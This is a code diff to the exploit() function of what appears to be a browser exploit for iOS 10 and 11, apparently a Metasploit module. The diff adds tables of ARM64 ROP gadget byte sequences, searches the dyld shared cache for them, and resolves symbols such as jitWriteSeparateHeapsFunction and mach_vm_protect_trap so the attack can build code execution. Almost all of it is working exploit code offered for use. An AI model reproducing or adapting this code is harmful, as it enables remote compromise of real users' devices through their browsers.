@@ -605,87 +605,73 @@ function exploit(){
             segs[i].addr = Add(segs[i].addr, cache_slide)
             alert('after' + segs[i].addr)
         }
-        var libs =
+           var libs =
         {
+            "/usr/lib/system/libdyld.dylib":                                        ["_dlsym", "_dlopen"],
+            #{ ios_11 ? '
+            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC29jitWriteSeparateHeapsFunctionE"],
+            "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp"],
+            ' : '
             "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
-            "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
-            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32taggedstartOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30taggedendOfFixedExecutableMemoryPoolE",
+            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC30endOfFixedExecutableMemoryPoolE"],
+            '}
+        }
+
+        #{ ios_11 ? '
+        var opcodes = {
+            // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
+            "ldrx8":     [ [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0] ],
+            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+            "dispatch":  [ [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ] ],
+            // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
+            "regloader": [ [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ] ],
+            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+            "stackloader": [ [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ] ],
+            // mov x4, x20 ; blr x8
+            "movx4":     [ [ 0xaa1403e4, 0xd63f0100 ] ],
+        }
+        var opcode_libs = [
+            "/usr/lib/PN548.dylib",     // dispatch, stackloader
+            "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
+        ];
+
+        ' : '
+        var opcodes = {
+            // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
+            "regloader": [ [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ] ],
+            "dispatch": [
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
+                [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
+            ],
+            "stackloader": [
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
+                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
+                [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
             ],
         };
 
-        var opcodes;
-        var opcode_libs;
+        var opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
+        '}
 
-        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
-            log('found iPhone OS 10')
-            opcodes = {
-                // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
-                "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
-                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
-                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
-                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
-                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
-                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
-                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
-                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
-                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
-                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
-                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
-            };
-
-            opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
-        } else {
-            log('found iPhone OS != 10')
-            libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
-                "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
-            )
-
-            opcodes = {
-                // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
-                "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
-                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
-                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
-                // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
-                "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
-                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
-                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
-                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
-                // mov x4, x20 ; blr x8
-                "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
-                // ldr x0, [x0] -- for debugging
-                "ldrx0x0":     [ 0xf9400000 ],
-            }
-            opcode_libs = [
-                "/usr/lib/PN548.dylib",     // dispatch, stackloader
-                "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
-            ];
-        }
-        alert('lookin through cache');
-
-        var syms = {};
-        var gadgets = {};
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
-       // alert(Add(hdr, r32(Add(hdr,0x18))))
-        alert("dyld cache images@" + imgs);
         var nimgs = memory.u32(Add(hdr, 0x1c));
-        alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
             var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.read(Add(straddr, i), 0x10)[0];
+                return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.read(Add(imgs, i * 0x20),8),cache_slide);
-            alert(base)
-            //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
-            log(fn())
-            if(opcode_libs.some(lib => strcmp(fn(), lib)))
+            var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
+            if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
-                alert("...")
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
@@ -699,11 +685,6 @@ function exploit(){
                             {
                                 var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
                                 if (keys.length == 0) break;
-                                var match = {};
-                                for(var z = 0; z < keys.length; ++z)
-                                {
-                                    match[keys[z]] = 0;
-                                }
 
                                 var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
                                 var size = memory.u32(Add(base, o + 0x28))
@@ -736,26 +717,31 @@ function exploit(){
 
                                 // Loop through the entire data map looking for each gadget we need
                                 for (var f = 0; f < size && keys.length > 0; f++) {
-                                    var op = allData[f]
 
+                                    // Check every gadget
                                     for (var z = 0; z < keys.length; z++) {
-                                        var key = keys[z]
-                                        var opcode = opcodes[key]
-
-                                        if (op == opcode[match[key]]) {
-                                            match[key]++
-                                            if (match[key] == opcode.length) {
-                                                gadgets[key] = Add(addr, (f - (opcode.length - 1)) * 4)
-                                                keys.splice(z, 1)
-                                                break
+                                        var key = keys[z];
+                                        var opcode_list = opcodes[key];
+                                        for (var y = 0; y < opcode_list.length; y++) {
+                                            var opcode = opcode_list[y];
+                                            for (var t = 0; t < opcode.length; t++) {
+                                                var op = allData[f+t];
+                                                if (op == opcode[t]) {
+                                                    if (t == opcode.length - 1) {
+                                                        gadgets[key] = Add(addr, f*4);
+                                                        keys.splice(z, 1);
+                                                        z = keys.length;
+                                                        break;
+                                                    }
+                                                    continue;
+                                                }
+                                                break;
                                             }
-                                        } else {
-                                            match[key] = 0
                                         }
                                     }
                                 }
 
-                                break
+                                break;
                             }
                             o += 0x50;
                         }
@@ -779,17 +765,11 @@ function exploit(){
                 fsyms(memory, base, segs, lookup, syms);
             }
         }
-        if(!gadgets['dispatch'])
-        {
-            gadgets['dispatch'] = gadgets['altdispatch'];
-        }
-        if(!gadgets['stackloader'])
-        {
-            gadgets['stackloader'] = gadgets['altstackloader'];
-        }
-        delete opcodes['altdispatch'];
-        delete opcodes['altstackloader'];
-        var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
+
+        var vals = Object.keys(libs).map(function(key) {
+            return libs[key];
+        });
+        var k = vals.reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
         for(var i = 0; i < k.length; ++i)
         {
             var s = k[i];
@@ -807,7 +787,7 @@ function exploit(){
             {
                 fail(s);
             }
-        }        
+        }
     
 }
     
